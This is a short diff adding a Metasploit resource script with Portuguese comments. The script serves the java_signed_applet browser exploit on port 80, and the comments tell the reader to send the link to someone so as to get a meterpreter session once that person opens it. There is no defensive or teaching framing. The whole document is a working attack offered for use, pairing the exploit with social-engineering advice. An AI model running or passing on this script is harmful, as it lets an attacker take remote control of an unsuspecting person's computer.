@@ -1,0 +1,8 @@
+# Agora você tem um site rodando na porta 80.
+# Somente envie esse link para alguem e você terá um meterpreter se a pessoa
+# abrir o link.
+
+use exploit/multi/browser/java_signed_applet
+set SRVPORT 80
+set URIPATH /
+run
